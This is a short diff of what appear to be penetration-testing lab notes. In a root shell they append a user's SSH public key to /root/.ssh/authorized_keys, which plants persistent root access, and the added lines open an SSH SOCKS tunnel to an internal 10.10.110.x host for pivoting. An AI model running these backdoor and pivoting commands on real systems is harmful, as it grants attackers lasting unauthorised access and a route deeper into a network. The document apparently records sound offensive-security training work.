@@ -8,3 +8,6 @@ bash-5.0# mkdir -p /root/.ssh
 bash-5.0# chmod 700 /root/.ssh
 
 bash-5.0# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCLGv08657zpdjBOYdwrF0Zq+/ecaYim24w5YX4mwcuWXNROp10JIamXx2x19ekFrT40UZc/DvsWdOKxGuAj4+DOWgMKikBsqTyRQuVT2/3GPxjMuz8KRaWwJj8c2M7e9h4gIbq4Ii7RDw/00GTI01dGVQhyskyEZNgsGWcjvBELUHonyZiMAvkR+r+y0vsW1GkQU56Ij38vFEiBqNPrHcUw75pvx5k2TlVvjNE7u6SMWl11SCca3lQf7Lfnh/F4L5pT2u9oFwITr4i9kn2w8/eCNJYjqjK2E3Z7SyolyigE4CjM/Y/S2HHQFVbYqU7OiBmjKDCDGVnumTYzbyE02EY6Vw7kULcrBjVspMwbXiXIjMC54gJzvz/O25/zM0ZQWRJcz9tQbfEy9GoCOeVYFbj2ydlqCAEmM594UMy/wa+Bjd2Szj6LiPZBJp+mqHrcBvl5qGdmBlkoTdLDZG/lFM40PPWABeIEqKkrTtyqor+9PALbuuNNEmUa1h4GFmVdCUrkbx8T8vWvJagE5m5L3FdmXWnC7rRCimX1MRhOOBeCgOt/k9JLKs6D9piVi++zksDAYeuU+UpcfUuUTM4P9Dp5oGgC5jKwHc724J5hSTdJ9gYIxVpMWxai9oapbgp5ilmrONABoO99GXfKrx1Vtlg66JT0gEJaJBOcungOi2jWQ== hunter@hunter" >> /root/.ssh/authorized_keys
+
+
+ssh -i ~/.ssh/id_rsa -D 1080 root@10.10.110.100
